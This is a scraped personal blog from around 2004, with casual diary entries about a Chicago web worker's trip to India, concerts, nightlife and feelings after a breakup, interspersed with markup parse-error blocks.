except the really ignorant U.S. I love international politics. go america. we rule. hah. umm yea. &lt;br /&gt;&lt;br /&gt;my life has been rendered into searching for bottled water. </pre></p>

                <p>so I can now make international calls to everyone. if you want to prank me - dial 9880281475. hah. umm yea. or something like that. I will try and set up an sms gateway so you can leave me messages. or I won&#8217;t whatever. <br /><br />i will post pictures soon. I promise. <br /><br />now I need food. it is lunch time. which is weird I know - since I am posting this at 2:15 am. ;)<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;last night guru took me around to MG road (which is a lot like manhatten - weird) and we just hung out. I got my prepaid card and we ate some food. I also found some bottled water (w00t) and then had some beers. the bar was really fun. it was a ROCK bar and had pictures of rockers all around. I sat under a picture of frank zappa. it ruled. I shoudl have taken a picture. then we took a cab home and I went to bed. I woke up and discovered that there isn&apos;t hot water. nor a shower curtain. so I lathered myself up and sprayed freezing water at myself. I taste like soap still. so cold.. I then ate an incredible breakfast. it was good. dosas with coconut chutney... mmm... and then went to work. I inadvertently found out  how to dial internationally and called alan and morgan. it was nice to talk to people I know. it is weird. I find myself struggling with a bit of culture shock. yesterday all I wanted was a sandwich. so I had one. today I just wanted to say hi to someone I knew. tomorrow I will probably want to get drunk and wrestle. yea know. the drill. &lt;Br&gt;&lt;br /&gt;i woudl probably like to come back. &lt;Br&gt;&lt;br /&gt;work is going well. it is nice cuz everyone here is all about getting work done - whereas in chicago - it is all about designing which is soo much more beurocratic(spelled horribly I am sure). the difference is very apparent when we have 1 one hour meeting that has results - versus a billion 2 hour meetings that spawn that 1 one hour meeting. I guess both are necessary - it is just amazing to see how fast everything gets done when the hard parts(design/content stuff) are already done. hehe. I guess I am saying I like the easy part. how lame am i. haha. suckers. I am in india. hahah. &lt;Br&gt;&lt;br /&gt;ok I better go before I hurt myself.  </pre></p>

                <p>so I arrived in india. it is pretty awesome. quite a change from california where I have secretly been living for the past ten years. <br /><br /> it all started on thursday. the night befopre I was to leave for india. hehe. my friend mike and nic came over from colorado and we hung out. we went to sushi and then to crobar. things got crazy and mike inadvertently got really drunk and assaulted red haired matts gf. so he got kicked out of crobar and proceeded to be sad all around chicago. we went to exit then home. I woke up with a couple HUGE bruises on my body from wrestling nic and went to breakfast with morgan. it was nice to see her but got sad. I am lame. haha. I totally was bummed out. but then I left for india. and I got better. <br /><br />i have sooo much spam. I need to install that spam filter crap<br /><br />so anyway. I flew to frankfurt. then I flew to delhi. where I was picked up by my driver(who drove 100km/h everywhere). I went to bed. and then got up at 7:00am and drove to agra where the taj mahal resides. <br /><br />now I must be clear about this cuz it sounds dumb. the taj mahal is quite possibly the most amazing thing I have seen. it was incredible. I have never been in a place like that. it is so perfect. and it is all marble. marble seems to me a rather &#8220;hard&#8221; medium to make a huge thing out of. and it apparently only took 22 years to make. wtf. ;) (oh and the guards at the taj kept messing with me - the first one kept touching my earrings and saying nice - and the second ome I woudl find a wife inside if I didn&#8217;t already have one. it ruled)<br /><br />in agra I went to a place where I was able to see the family that orginally did the inlay work that is on the taj. they are a bunch of kids sitting in a room making marble inlay stuff. it is pretty insane. I got some. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;i also picked up a rug. haha. &lt;br /&gt;&lt;br /&gt;my guide at the taj was awesome. he knew so much. he also took me to the red fort - which is also awesome. these monuments don&apos;t really make sto me. they are so incredible. both the taj and the red fort are things that I never really dreamed of actually existing. quite something. after taht we had some food. quite nice. wait. the order is screwed up. food. then red fort. also. everything is owned by tata (my hosts here). my &quot;personal guide&quot; (a really awesome guy who basically took care of me and was my company for the day in delhi) and I just hung out most of the day. it was seriously awesome. he told me all the secrets of india. &lt;br /&gt;&lt;br /&gt;then we drove back. I saw and elephant and a monkey. also.. apparently a new trend is to buy the chassis of the truck and not get the body. it is cheaper and you can buy/build the body elsewhere. haha. wtf. I want to put a small car body on the chassis of the truck. &lt;br &lt;Br /&gt;&lt;br /&gt;i am taking a lot of pictures. they are probably all poor. but yea.&lt;br /&gt;&lt;br /&gt;so I got back to delhi about 8 and I was incredibly tired. so I slept. and sleep I did. except for the dream of the rat eating my face (??was it a dream!?) everything went well. 
&lt;br /&gt;&lt;Br&gt;i woke up this morning and flew to bangalore (which is quite nice - a lot more mild than delhi). jet airways is pretty awesome. almost better than lufthansa. and then I took a drive to my guest house. which is really nice. (btw - they DO refill the water bottles. I caught them.. hehe. well they refill them with purified water - but I don&apos;t trust taht stuff - only aquafina for me. good thing pepsi lives in india too). the guest houses are so so nice. I can&apos;t really describe what these small apartments are like. they are like in the movies. with balcony&apos;s overlooking pretty scenery and whatnot. it is pretty insane. I feel like I am in a foreign land. hah. &lt;br /&gt;&lt;br /&gt;so that brings me up to date. tomorrow I will attempt to post pictures. also. I will attempt to get a phone with sms so I can bug all you ;) and post my photolog pictures. sad day I can&apos;t now. stupid lack of prep on my part. ;) hehe. </pre></p>

                <p>i listened to cat power on the way to work. man. that music is sad. hah. I think one of my favorite songs by her is &#8221;<a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewAlbum?playlistId=2960659&amp;selectedItemId=2960635'>good</a> <a href='http://www.sing365.com/music/lyric.nsf/Good-Woman-lyrics-Cat-Power/744491FBEBC1CBE748256D41000D087E'>women</a>.&#8221; hmm. kinda sad. ;)<br /><br />last night was pretty fun. I went and saw black print at the double door, then I went and I hung out with severn and val at danny&#8217;s. it was fun to hang out with them. I realized while walking to danny&#8217;s by myself - that I really shoudln&#8217;t just hang out with my room. unlike some of my friends, I get a lot of power from hanging out wiht people. it makes me go. heh. and the last couple days I have hung out with my room, my rommmates and morgan. all of which has been good. but I haven&#8217;t really hung out with my friends. so last night. I did that and it ruled. heh. so anyway.. after I hung out at danny&#8217;s I went to the big horse (ugh) and saw matt and erica&#8217;s band play. they were really good. it was pretty cool. I hope they get some good gigs. I would like to see them at a legit venue (rather than the big horse). hah. then I somehow managed to goto club foot, and then somehow I managed to make it to the <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/060520040916/Nokia6600(656).jpg'>hollywood grill</a>. seriously. wtf. I have no idea how I can do that (the food heh). but yea. <br /><br />i end up waiting for emails far too often. I hate that. <br /><br />i need to pack. right now everything is grouped appropriately. however it isn&#8217;t packed right. I need to make sure I have everything. I am scared about that. I imagine it will work out. unless I forget my passport in frankfurt or something. hah. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>the whole thing is so strange. I think I coudl say that right now I am experiencing some of the strangest emotions and experiences I have had in awhile. mostly due to work, india, morgan, friends, general life, real estate, money. yea know. the good stuff. all that stuff just creates such anxiety in my life. it is so so weird. <br /><br />however, as confusing as it is, it isn&#8217;t bad. in fact a lot of it is good. a lot of it is also hard though. I hate hard things. but the hard things are not destroying life - nor are they actually hard. they are just different than the simplicity of my usual life. <br /><br />i think the difficulty comes when I find incongruencies within what I feel is the &#8220;right&#8221; decision and what I find my heart wants to do. this &#8220;problem&#8221; transcends all of the above mentioned portions of my life. it isn&#8217;t necessarily a plague as much as it is a minor affliction. it especially comes forward when I think about how things are goign with morgan. it rules that we are hanging out again. but it is totally hard (especially when I am weak (which is right now(i mean like today at 4:46))). but it is getting easier. but it is also maintaining a hardness which I am not really into. but I really enjoy it and I don&#8217;t think I can not do it. so I have this dichotomy that exists where I have these very strong feelings that are contrary and thus in battle. but I don&#8217;t think it is a problem. cuz when I am outside - and the sun is shining. there is no issue. but when I am inside. thinking. reading specific blogs. looking at specific photos. this shit gets hard. (i guess I could just stay outside(thus india hehe)). but yea. I attempted to describe this last night using the analogy of a slow moving tornado. it didn&#8217;t work. but I was attempting to explain how my head is mixed up. but clear. if that makes any sense at all. <br /><br />stupid emotions. I sometimes feel that this is all drival. that I shoudl just ignore and move on. but then I remember that I don&#8217;t want to ignore hide or whatever. I am unable to do that. I explode and nobody wants that.<br /><br />i am so affected. <br /><br />and I am going to india. <a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewPublishedPlaylist?id=34004'>wtf</a>. hahah. <br />check <a href='http://images.amazon.com/images/P/0609807919.01._PE20_PIdp-schmooS,TopRight,7,-26_SCMZZZZZZZ_.jpg'>this</a> out.</p>

                <p>i hate feelings. I hate how small things can cause such weird reverberations within my self. it is hard. I can&#8217;t sleep. it hasn&#8217;t anything to do with anything. I just lay down. and I look at the ceiling. and I get kinda sad. not really depressed or pointedly sad. just a sinking feeling. like. I don&#8217;t know what is going on in my head. but I do know. it isn&#8217;t really all that weird. just annoying. I was spooked. I often am. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;so I yoyoed a bunch. that helped. I practiced some new tricks. I got some good ones. you should check them out. I really like my night moves 3. it is dope. very smooooth. heh. however it is like 3:45 and I am not in bed. I have to work at 9 of course. andi have been home since 1. sitting in my room. wallowing of sorts. not really doing anything. wishing there was something to do. I miss conversations. I got a taste yesterday of what I miss. and it is a lot better now. which is relaly good. however. it also reminded me (when I am alone listening to depressing music and not really being rational) of the feelings once felt. and how they are not really different. just un-accompolishable. hah. I would like to say whatever without negating my post. so here. whatever. hah. &lt;BR&gt;&lt;br /&gt;i am almost fully prepared to goto india. that is pretty exciting. I need to listen to different music very bad. this music is killing me. hah. I don&apos;t know what to listen to though.  I am not really in the mood for anything. I guess I am attempting to sleep so I don&apos;t really need to listen to something good. maybe something more calm. hah. like arvo part or whatever. hmm. I will soon see. &lt;Br&gt;&lt;br /&gt;this too will pass. I know. </pre></p>

                <p>but I did manage to arrive to work at a decent time. not the 4:00 I feared while attempting to fall asleep last night at 4:00am. I don&#8217;t <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1083678359-Nokia6600(624).jpg'>look well rested</a>. heh. hopefully in a couple minutes/hours/days. haha. I need a nap. already. and I barely got up a couple minutes ago. heh. <br /><br />a movie was being filmed on the way to work today. it was pretty crazy. mostly cuz all of a sudden there was a billion people on my way to work. and it didn&#8217;t make sense. I wonder what movie/who/whatever. I imagine it was oceans 12 or whatever. heh. hmm.</p>

                <p>tonight was good. I hung out with morgan a bunch. it was pretty weird. honestly. very strange. but it was also great. it is pretty strange - cuz we didn&#8217;t break up with an absolute reason. it just didn&#8217;t work out. so. are feelings are pretty much intact. just 3.5 weeks detatched. so yea. it was relaly great to see her and hang out. she hasn&#8217;t changed in the couple weeks. no missing arms. haha. whatever. it ruled. we had a good time. we went to get food (which I ate non of - I was nervous) and we got coffee. then we went to rodan to get drinks. we hung out until it was dangerous to hang out any more. so we left. <br /><br />it was relaly hard to leave. as it always is. when I was walking away. I looked back and saw she was looking back at me too. that was kinda hard. so I shook my fist at her. ;) I rued the day. hahah. just kidding or I guess this is the internet so j/k. I am kidding. becase it was nice to see that she felt the same. or felt the same need to look back. that is of dreams. haha. <br /><br />yea. I am a lot more emotional or upset about this - then I will admit(but I will blog it?? wtf?). it is just so weird to have feelings going both ways. because no matter which way you choose - it hurts. and we choose the safe way. but it is still hard. and I hate it when it is hard. but it is safe. and I like safety. but safety is sometimes really dumb. not like the other option is smart. just that both are hard. <br /><br />it was amazing though. how thoroughly we are able to be close - even with distance. I really missed her. which makes getting back to hanging out soooo nice. I am excited once again for what the future holds. which is strangely saying that I was once not excited. I am ALWAYS excited for what the future holds. <br /><br />i like holding hands. haha. (totally helping). <b>;)</b><br /><br />microphones however. are helping. <br /><br /> this week will be crazy. I have to get all ready fo india<br />morgan says I shoudl get a phrase book - but I don&#8217;t know where to get a phrase book at. I think I shoudl get a lot of money. but I also don&#8217;t know where that is at either. someday. <br /><br />today turned out t obe really good. I was quite apprehensive at the start. and in the end. it worked out very well. I am not disappointed. <br /><br /><a href='http://www.proxientunit.com'>mike</a> is coming soon. I am excited. but I am also out of town. sad sad day. ;) he gets here thursday afternoon. so thursday night - the night before my 24hour flight. I will be engaging in a small amount of debachery. I am happy abotu that. <br /><br />for those that are important: justice will be served. I promise.</p>

                <p>tonight I am going to dinner with morgan. it is kinda weird. I haven&#8217;t seen her since we broke up. I am a bit apprenhensive - not really about seeing her. just about the whole situation. it is kinda scary. haha. I am glad, however that it is scary by design and not scary or uncomfortable because I happened to run in to her randomly. we have been talking on email - so it shoudln&#8217;t be too uncomfortable. I guess I just worry about what happens when life moves on - but my inside(heart/brain - etc) doesn&#8217;t. yea know. it could be weird/hurtful. I doubt it. but I am often the pessimist in regards to this kinda stuff. stupid this kinda stuff. umm. whatever. ;) I really don&#8217;t know what I feel at this point - so it should be interesting ;) <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;BR&gt;&lt;br /&gt;i need to do laundry. that I what I feel. hah. &lt;br /&gt;&lt;br /&gt;last nigth was pretty fun. I went tot rainbo with claudia and her friends, went to spybar to see jeffrey, then went to neo with jeffrey and his friend and finally made it to crobar. crobar was INSANE as usual. I hung out with claudia&apos;s friends. they were dope. really funny. apparently I am supposed to buy then all stuff from india. hah. weird. I had a good time. I got home real late (but not that late) and slept like a bunny.</pre></p>

                <p>today I went downtown and picked up voltage converter and some clothes. everyone has been telling me to go and get light colored clothing so that I don&#8217;t A) burn up and B) get attacked by bugs. apparently there are a lot of bugs. I am not a fan of disease so I guess I will head their suggestions. stupid disease. so I got some clothes. mostly brown pants and nice <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1083449032-Nokia6600(562).jpg'>blue and white shirts</a>. haha. I went to h and m and they were rather busy. there was s huge line for the dressing room. I hate lines like that. mostly because it seemed to occupied by people whom I woudl HATE to be in line with. haha. versus all the lines I like which are obviously occupied with people I WANT to be in line with. wtf. yea nobody knows. <br /><br />i think it is weird that skinny puppy is touring again. <br /><br />i feel a little better today. I really wonder if the weather is effecting my mood. I mean. it obviously is. cuz the weather is dreary and I am dreary. I listened to a bunch of death metal while I was downtown. that ruled. I wished the whole tiem I was walking around with a huge &#8220;ghettoblaster&#8221; and listening to the same music. it is the same daydream that involved me and a seven series bmw - listening to maiden. ahh. I love that dream. <br /><br />i am getting pretty excited. I have to get my malaria medicine and bug spray. I think that is about it. oh and all sorts of misc stuff I keep forgetting about. <br /><br />the new dead prez album is quite good. I think it is interesting how violent it is. someday I will see isis. <br /><br />someday summer will be here too. <br /><br />wtf. everyone is all &#8220;yea I will goto mean girls..&#8221; and then they don&#8217;t go. seriously.</p>

                <p>tonight I saw einstuzende neubauten. I am tired. it was good. I hung out with cole and my friend kelly who bartends at metro. it was pretty fun. cole and I haven&#8217;t hung out in a long couple months. I missed him. it was nice to get back into the swing of things. fot the most part I feel pretty weird right now. I wish I didn&#8217;t feel that way. I am totally missing morgan. which is kinda lame. I mean - it makes sense. but whatever. I jus thate this whole thing. it shoudl be easy by now. but NOOOO.. had to be long and drawn out. I think I miss the companionship and bantor. but that is gunna be hard to regain without being confused. hopefully it will happen soon. I have no doubt that we can figure it out. I am slo weirded out about saving money. I am SOO bad at it. I hate it. <br /><br />stupid feelings. <br /><br />hopefully tomorrow will be good as well. <br /><br />i will sleep well.

                <p>so when I was little. skinny puppy was my favorite band. now they are apparently back and touring. I discovered this when I woke up on sunday and had a shiny metal urge to chekc the readers early warning list. much to my amaze - skinny puppy was playing at the vic. so I immediately attempted to secure tickets. no luck. all sold out. in fact I think they were SOLD OUT. like in caps. pixies style. I was really sad. this is the only band that I haven&#8217;t seen from my childhood. first it was janes addiction - saw them in 2001(good stuff - sorry pam <b>;)</b>). then pixies - hopefully <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1082691247-Nokia6600(469).jpg'>seeing them soon</a>. and now skinny puppy is coming. but it was sold out. so I immediately found matiss and we figured out how much we would pay to see our favorite of favorites. I <a href='http://chicago.craigslist.org/tix/29718513.html'>searched</a> and found some dude who was offering them for 100. I was like.. hell no&#8230; so I looked at a ticket broker and finally <a href='http://www.goldcoasttickets.com/LiveTicketDetail.asp?EventID=286309'>found some</a>. totally more than I would like to spend. but whatever. I NEED to see them. hahah. I am really excited. whee.</p>

                <p>the last couple days have been pretty weird. I didn&#8217;t feel like posting at all. which is in itself pretty different. usually I post as a decompression activity - or because I want to say something. however in the last couple days I have really felt that my motivations for posting on my &#8216;blog&#8217; were not exactly legit. hah. they were not really illegal - just not necessarily in the same vein as the motivations that usually power a post. so I think I have accompolished my fears or whatever and am now able to post. heh. <br /><br />the microphones are incredibly good. I enjoy them immensely. <br /><br /> this weekend was pretty good. friday - me and some coworkers found ourselves engaged in debaucherous exercises at the hard rock hotel bar. heh. some friends of mine work there and I go to visit them. heh. which is really silly. I could visit them at many other less expensive places. hah. but whatever. we went and hung out there until around 7:30 or 8. which in turn made me rather intoxicated. so I went home and got dinner with hiromi, hilary, and hiromi&#8217;s friend katie. it was fun. the pitcher of margaritas did not help our cause. after dinner - matiss and I walked/ran to the movie theatre and watched kill bill 2. it was nice. then courtney came over and <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1082802398-Nokia6600(475).jpg'>we all chilled</a>. and welcomed a very drunk hiromi home. hah. it was very humorous. I went to bed. at 6. after playing computer. <br /><br />the next day I slept as I haven&#8217;t in weeks. well that is a lie. but I ended up sleeping until around 4:30 or 5. which was something I had sorta not done for quite awhile. it was exactly what I wanted to do. as soon as I woke up. I started helping my <a href='http://brandie.22salt.com/'>friend</a> with her homework. eep. I miss learning. well I miss the structured learning experience. I haven&#8217;t engaged in it in oh so long. helping her was quite funny - the first time I got out my old books in quite a few years. really the first time I have installed any development software on my desktop - which is kind of weird. after 12. I went out and met <a href='http://projektbrock.com/'>brock</a> at the hideout. for some insane reason we went back to the hard rock hotel and saw <a href='http://www.assassins.com'>aaron</a> djing. it is such a poor venue. brock and I just sat there drinking beers and getting hit on by older suburb women. not really what I am looking for ;) after that we went to iggys and had food. good food. then I went to a party. I really attempted to go home. but jordan and ayca kept calling. so I went to this ghetto party and hung out with soem friends. it was pretty fun. good music. good peeps. apparently there is some good yoyo footage. I left rather abrubtly. I just felt like I needed to go home. so I did. and then I stayed up til 6, played computer. went to bed. <br /><br />sunday I slept quite a bit. woke up. played computer. hung out. went and saw <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1082953453-Nokia6600(497).jpg'>tracy and the plastics</a>. then took the <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1082953643-Nokia6600(501).jpg'>bus</a> home. <br /><br />i think what is weird - is the residule feelings that come an go like aftershocks from an earthquake. it is so weird. it is kinda annoying. they just lead to irrationality. and situations of unconfidence. I hate those things more than almost anyhthing else. it puts me in a such a weird place. but it is so brief. whatever. I hate it. <br /><br />i am excited to goto india. kinda scared. I have never traveled extensively by myself. and I don&#8217;t have any idea how to prepare for this trip. no idea. what to bring or whatever. <br /><br />i apparently also like inserting periods in the middle of sentences. <br /><br />i want to bring a camera. and malaria medicine. that is about it so far. my travel doctor told me I need to wear light colored clothes. hah. I don&#8217;t have any light colored clothes. seriously. I have like.. umm.. one pair of white socks. heh. but I imagine it will go well. and if not.. if I am shanked in the parking lot.. so be it I guess. ;)<br /><br />all morning my friend scott and I have been arguing about lil-jon. heh. he alleges that lil-jon is trash. I say lil-jon is awesome. we tied. <br /><br />i suddenly realized that I am leaving in barely 2 weeks. wtf. <br /><br />recently I have had a couple people respond to my blog. it is interestig when I hear feedback. regardless of what it is. the most recent occurance came from my friend callie who said she read it all. heh. awesome. she was relaly nice and said nice things. it was weird however. cuz I forget that my life is so transparently laid out for all. it totally makes me wonder about hte sanity of it all. the other occurance of feedback was from a guy in the bloggers meetign I went to. he said that it scared him. haha. that ruled. I enjoy blogging and probably won&#8217;t stop. it is mine. all mine. I rule. <br /><br /><b>RULE!</b></p>

                <p>my arms hurt a lot. I got my vaccinations today for india. it ruled. however. it has destroyed my arm. DESTROYED. well arms really. both are sooo sore. one of them hoever had two shots. that one is very very sore. the word is that I may be going quite a bit sooner than I had originally thought. which is both good and bad. june was going to work out really well. now I guess may will have to work out well. hehe. <br /><br />i am pretty tired as well. they said that this woudl be a side effect. but seriously. <br /><br />anyway.. <br /> heh. last night was pretty interesting. we had a marathon meeting on DB design at work. I love that stuff. it is so entertaining. for some reason architecture is so close to my heart. haha. anyway. then cool stuff happened. then I went to the first &#8220;chicago bloggers who are interested in tech.&#8221; meeting. it was organized by <a href='http://weblogs.asp.net/jkey'>jeff key</a>. it was pretty cool. I enjoyed hanging out and talking about the shit I talk about with everyone. but this time I was able to get a response from like minded people. if only we could get some ladies up in there. haha. I konw it is a longshot. but whatever. it was funny - cuz I am not a .net/asp/windows guy at all and everyone else pretty much was. so I basically just sat and listened and then ranted about cell phones. heh. it ruled. <br /><br />i just got out of a meeting regarding my trip to india. it looks like I will be leaving on may 7th and returning on the 16th. it shoudl be fun. a lot of working and a weekend. I wish it was longer. but whatever.</p>

                <p>today has been pretty good so far. last night was fun.

I had never seen matt play guitar before - so it was an educational experience. heh. <br /><br />i got hiromi a <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1082476656-Nokia6600(418).jpg'>domo-kun</a>. she likes it a lot.<br /><br />i am starting to make preparations for my trip to india. it is kinda weird. I have to be <a href='http://www.nmff.org/travelmedicine/index.asp'>vaccinated</a> and all that. and I gotta get my visas. it is all so strange. I am getting pretty excited however. <br /><br />all my work clothes are the same colors. almost. different shades of greys it is funny. monday and tuesday I wore the exact same clothes - just different colors. one day black pants/grey shirt - the next day grey pants/black shirt. both the same. <br /><br />i somehow screwed up my phone. heh. it just sits here accepting text messages. billions of them. well only about 15. but still. I probably only sent 3. <br /><br />it is sorta weird out right now. I can&#8217;t tell if I am paranoid or not. or if I am just dealing with things weird. I hate it either way. but whatever. I will just have to see how things go. <br /><br />i like brand nubian a lot.</p>

                <p>i can&#8217;t seem to sleep. I mean. I did take a nap from 10:00-12:00 haha. it wasn&#8217;t so much as a nap as much as it was an alcohol enforced sleep. heh. the plan was to have all of our friends meet us at the <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1082337540-Nokia6600(411).jpg'>bar</a> that is really close to my house. it worked very well. we got there around 4:30 and left around 8:00. we had pizza there and bunchs of tequila shots. heh. at 8 or so I accidently got into becca&#8217;s car and got ice cream. I then came home and slept for awhile. until I was woken up by crazy drunken jill. it was pretty fun. it is such a nice night out. like 75 degrees. I wish I was camping in the park nearby. wait. no I don&#8217;t. I don&#8217;t wish that at all. <br /><br />in my non-sleeping I have been cleaning. I put away and folded my laundry. I ran around and cleaned up my room. I listened to explosions in the sky. sometimes I wish I coudl find the mix between isis and explosions. I think that would be the perfect band. it also might end up being pelican. which reminds me that I need to be reminded to goto the pelican show on may 2nd. with mastodon. it shoudl be good. <br /><br />be prepared for our <a href='http://www.covetous.net'>new project</a>. it will rock you.<br /><br />things are good. this week end was ok. a little bit <a href='http://dylanreed.org/archives/000133.php#133'>sad</a>. but it was ok.

                <p>tonight I went and brainstormed with john and hannah for hours. it was mind numbing. afterwards we kidnapped marcia and took her to smokedaddy&#8217;s. I had never been there, and I had never really heard of it. however it was quite good. I had a briskett sandwich. it ruled. I got all dirty. I ate so much so fast. sometiems beer and food tastes so damn good. it is pretty funny. we gorged ourselves. then suddenly felt the need to escape. adn we did. I went home and crashed hard around 10:30. it was such a release to just eat and then sleep with no repercusions. leprechauns. I need to listen to pretty music. <br /><br />this weekend is full of excitingly good bands playing. first on friday is &#8220;tv on the radio&#8221; and then on saturday pinback and enon at the logan. hte logan ballroom is funny cuz it is accross the street. heh. also on friday is felix at crobar. that will be fun. chris will be back. it will be nice. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;i just wrote something and deleted it. I hate that. &lt;br /&gt;&lt;br /&gt;i am ready &quot;the world according to garp.&quot; I quite enjoy it. I am listening to the new fantomas disc. I am bord with it. I think I am going to put on the new &quot;why&quot; album I just got. it is nice. like &quot;tv on the radio&quot; hip hop - hehe. &lt;br /&gt;&lt;br /&gt;i think it is weird to attempt to avoid reality. &lt;br /&gt;&lt;br /&gt;i just put the new &quot;why&quot; album on and it is totally not doing it for me. I need something pretty to sleep to. maybe an explosions in the sky disc. or maybe godspeed. maybe damned astor piazolla. although with more listening I quite enjoy the &quot;why&quot; disc. it is so nice. it is a strange combination of ween like nonsense and slug like lyricism. kinda calm and yet I end up bobbing my head along with it. weird. 
it is called Oaklandazulasylum btw. wtf kind of name is that?&lt;br /&gt;&lt;br /&gt;my parents are coming out pretty soon. it will be nice to see them. I think I am going to new york soon. I need to get out of my world. it will be nice. and then probably to colorado. and then hoepfully to india. and then hopefully dylan will come here in july. and hang out. &lt;br /&gt;&lt;br /&gt;periods are the new commas, question marks and any other punctuation I randomly replace with periods. &lt;br /&gt;&lt;br /&gt;unicorns are no longer the new black. the new black is once again black. black as the night. black as my once warm heart. haha. &lt;br /&gt;&lt;br /&gt;i really think that bush has gone mad. seriously. also. it seems that maybe the media is starting to notice. it is pretty funny really. &lt;br /&gt;&lt;br /&gt;i appreciate RSS readers. I like looking at the missed connections. via rss. it makes my &quot;browsing&quot; go a little easier. and a little quicker. so all you bastards that have blogs. update them. </pre></p>

I am happy with the results. hehe. ultra nerd. relaxing the reality. <br /><br />time for the nap of the night. which is how I maintain no sleep. and how I maintain sanity. <br /><br />i am really digging the <i>tv on the radio</i> discs I picked up today. I like the vocals a lot. particularly on &#8220;poppy&#8221; and &#8220;staring at the sun.&#8221; <br /><br />my fears are not ones that should be worried about. I haven&#8217;t lost anything. I mean. nothing was taken away from me. I need to remember that. a redefinition is in order. that is very hard. but it isn&#8217;t impossible. and it isn&#8217;t impossible to do it in such a way were what was built is destroyed. <br />my single biggest fear is the awkward moments. the points in time where we are only aware of what once was. not what will be. as funny as awkwardness is. it is this situation that strikes fear in my cold cold heart. I get scared of it so much. I guess I don&#8217;t want to be reminded of how awesome it was. I want to be reminded of how awesome it is. but I don&#8217;t want to forget how it was either. that isn&#8217;t what I mean. I don&#8217;t want to lead a revisionist past that I see so many people attempting when situations such as these go down. I want to not forget and not remember at the same time. it tears me apart. it makes me leary of communication. leary of contact. but. it makes me crave both just the same. eep. in the long run. I know these feelings will pass. but in regards to now. it is hard to imagine that a time exists without this heavy heart. <br /></p>

<p>the part of me that wants things now and fast really would like to bypass these hard portions and go straight to the fun parts. <br />this summer will be the fun parts. <br />i promise.</p>

                <p>today everything I am wearing is either grey or black. even my underwear and socks. it is kinds funny. I didn&#8217;t mrean to and I didn&#8217;t really think about it until I was on the train. but yea. everything is grey. hah. <br /><br />it is still sad out today. the weather is nice though. the sun. however it is cold. it is kinda how I feel right now. <br /><br />last night morgan sent me an email that really made me feel better. of course I didn&#8217;t get it until this morning - cuz I broke email again. haha. but I fixed it. but yea. it is funny how little words can make or break so much. <br /><br />i am currently really into listening to &#8220;explosions in the sky.&#8221; very good. exactly what I need. anything with vocals has the potential of invoking emotions which I don&#8217;t really want to share with my work environment. <br /><br />i really didn&#8217;t want to get up today. I enjoyed my super weird dreams and soft blankets. <br /><br />i think that today my goal is to try and buy a damned bike. I have attempted with failure for the last 2 days. hah. stupid christians and their &#8220;holidays.&#8221; we all know it is a ploy to sell chocalate and jesus. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;bR&gt;one of the things that is interesting about the last couple days. first off - nothing really went how I wanted it. since about wednesday. it all broke. haha. but starting yesterday - they started to patch themselves up. everything. it is like there was a flaw in the world of harper karma - and now it is coming back. sometimes when bad stuff happens it really makes you remember how lucky you are. overall. yea yea yea. &lt;b&gt;;)&lt;/b&gt;</pre></p>

                <p>tonight was one of those times. where it all makes semse but it didn&#8217;t make anything better or easier. only harder. but it will get better. I know it. in fact I feel better already about this one than I did about the last time. hah. so I guess I am a free agent. which I am not relaly happy about. I don&#8217;t want to be a free agent. stupid agents. but I do think that this decision will lead to a better place for both morgan and myself.

                <p>so my l33t skills didn&#8217;t work out today. I totally screwed up my servers. well not really. I am not on my new servers yet.

                <p>This weekend was good. on friday there was a blond redhead show. I was initially a bit scared that they woudn&#8217;t represent their recorded music well - but I was wrong. they did a great job. as soon as the women started singing, it was apparent that her talent wasn&#8217;t based on some studio tricks. after the concert I went and hung out a bit with morgn and alan. then sleep. oh precious precious sleep. then. I woke up. I woke up freaked out. haha. it didn&#8217;t rule. however I figured it out. and BAM was better. <br /><br />i then went to a <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F040420040229&amp;img=Nokia6600%28148%29.jpg'>dope version fest</a> meeting and hung out with all those fellows. <br /><br />then I went home and immediately went to the BFA show. it was pretty good. a FUCK load of art. seriously a bunch of art. possibly too much. a friend of morgans <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F040420040229&amp;img=Nokia6600%28151%29.jpg'>was in a portrait</a>. it was funny. we then went to chicago diner where I had a bunch of food very quickly. then I broke. hah. I then took food to morgan - who is sickish. hopefully she will be better soon. and then we went to a party. <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F040420040229&amp;img=Nokia6600%28158%29.jpg'>hiromi</a> , <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F040420040229&amp;img=Nokia6600%28176%29.jpg'>alan</a> and a blurry <a 